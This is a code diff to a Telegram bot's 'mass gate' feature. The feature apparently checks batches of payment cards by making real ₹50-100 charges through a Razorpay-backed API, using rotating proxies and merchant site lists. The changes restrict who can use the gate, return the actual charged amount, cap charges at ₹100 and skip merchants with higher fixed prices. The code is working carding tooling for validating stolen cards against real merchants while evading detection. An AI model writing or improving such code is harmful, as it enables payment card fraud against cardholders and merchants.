@@ -12,7 +12,7 @@ from datetime import datetime
 
 from aiogram import types, F, Router
 
-from database import is_gate_enabled, get_user_credits, is_owner_user
+from database import is_gate_enabled, get_user_credits, is_owner_user, has_rz_access
 from sub import get_premium_status
 from mass_gates._batch_common import run_batch_check, handle_result_callback, handle_stop_callback, show_selection
 from mass_gates._tg_helpers import safe_reply
@@ -42,19 +42,6 @@ def load_sites():
     except Exception:
         return []
 
-
-async def _get_rz_pool_proxies():
-    """Razorpay's own live proxy pool from :9000 (NOT the /proxy DB)."""
-    import aiohttp
-    try:
-        async with aiohttp.ClientSession() as s:
-            async with s.get(f"{RZ_API}/pool-list", timeout=10) as resp:
-                if resp.status == 200:
-                    data = await resp.json()
-                    return data.get("proxies", [])
-    except Exception as e:
-        logging.error(f"[mrz] pool-list error: {e}")
-    return []
 
 
 def _site_key(site):
@@ -227,15 +214,16 @@ def _acquire_free_proxy():
 
 
 def check_fn(card):
-    """Sync single-card check against the Razorpay API (VPS:9000). Returns (status, msg, brand)."""
+    """Sync single-card check against the Razorpay API (VPS:9000).
+    Returns (status, msg, brand, amount_inr) — amount_inr is the actual charge."""
     site = _next_site()
     if not site:
-        return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN"
+        return "ERROR", "No sites loaded (rz_site.txt empty)", "UNKNOWN", 0
     proxy, lock = _acquire_free_proxy()
     if proxy is None:
-        return "ERROR", "No proxies loaded", "UNKNOWN"
+        return "ERROR", "No proxies loaded", "UNKNOWN", 0
     try:
-        amount = _amount_override or random.randint(5000, 10000)
+        amount = _amount_override or random.randint(5000, 10000)  # ₹50-100
         q = urllib.parse.urlencode({
             "cc": card,
             "site": site,
@@ -248,25 +236,30 @@ def check_fn(card):
             resp = urllib.request.urlopen(url, timeout=180)
             data = json.loads(resp.read().decode())
         except Exception as e:
-            return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN"
+            return "ERROR", f"API: {str(e)[:80]}", "UNKNOWN", 0
         status = str(data.get("status") or "error").lower()
         msg = data.get("message") or data.get("reason") or "N/A"
         m = (msg or "").lower()
-        if "amount too small" in m:
+        actual_paise = int(data.get("amount_paise") or amount)
+        amount_inr = actual_paise / 100
+        # site fixed price above ₹100 -> unusable for checking, skip it
+        if "amount too small" in m or actual_paise > 10000:
             _bad_sites.add(_site_key(site))
         if "server error" in m or "site issue" in m:
             with _site_guard:
                 _site_dead_until[_site_key(site)] = time.time() + SITE_DEAD_COOLDOWN_SECONDS
-        
+
+        if actual_paise > 10000:
+            return "ERROR", f"Amount too high (₹{amount_inr:.0f}) — site skipped", "UNKNOWN", amount_inr
         if status == "charged":
-            return "CHARGED", msg, "CHARGED"
+            return "CHARGED", msg, "CHARGED", amount_inr
         if status == "approved":
-            return "APPROVED", msg, "APPROVED"
+            return "APPROVED", msg, "APPROVED", amount_inr
         if "3ds" in m or "3d secure" in m or "3-d secure" in m:
-            return "3DS", msg, "3DS"
+            return "3DS", msg, "3DS", amount_inr
         if status == "dead":
-            return "DECLINED", msg, "UNKNOWN"
-        return "ERROR", msg, "UNKNOWN"
+            return "DECLINED", msg, "UNKNOWN", amount_inr
+        return "ERROR", msg, "UNKNOWN", amount_inr
     finally:
         _record_site_use(site)
         _record_proxy_use(proxy)
@@ -284,12 +277,15 @@ async def mrz_command(message: types.Message):
     user = message.from_user
     user_id = user.id
 
-    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
-    if not is_premium:
+    if not await asyncio.to_thread(has_rz_access, user_id):
         await safe_reply(message,
-            "💎 𝗣𝗹𝗲𝗮𝘀𝗲 𝘂𝗽𝗴𝗿𝗮𝗱𝗲 𝘆𝗼𝘂𝗿 𝗽𝗹𝗮𝗻 𝘁𝗼 𝘂𝘀𝗲 𝘁𝗵𝗶𝘀 𝗳𝗲𝗮𝘁𝘂𝗿𝗲.\n\n👉 𝗨𝘀𝗲 /plan 𝘁𝗼 𝘂𝗽𝗴𝗿𝗮𝗱𝗲.",
+            "🔒 <b>𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗔𝗰𝗰𝗲𝘀𝘀 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱</b>\n\n"
+            "𝗬𝗼𝘂 𝗱𝗼𝗻'𝘁 𝗵𝗮𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗼 𝘁𝗵𝗲 𝗥𝗮𝘇𝗼𝗿𝗽𝗮𝘆 𝗴𝗮𝘁𝗲.\n"
+            "𝗢𝗻𝗹𝘆 𝘁𝗵𝗲 𝗱𝗲𝘃 𝗰𝗮𝗻 𝗴𝗿𝗮𝗻𝘁 𝗶𝘁.",
             parse_mode="HTML")
         return
+
+    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
 
     raw_text = ""
     cmd_text = message.text or message.caption or ""
@@ -319,7 +315,7 @@ async def mrz_command(message: types.Message):
     global _amount_override
     amt_match = re.search(r'amount\s*=\s*(\d+)', raw_text, re.I)
     if amt_match:
-        _amount_override = int(amt_match.group(1)) * 100
+        _amount_override = min(int(amt_match.group(1)), 100) * 100  # cap ₹100
         _amount_paise = _amount_override
         raw_text = raw_text[:amt_match.start()] + " " + raw_text[amt_match.end():]
     else:
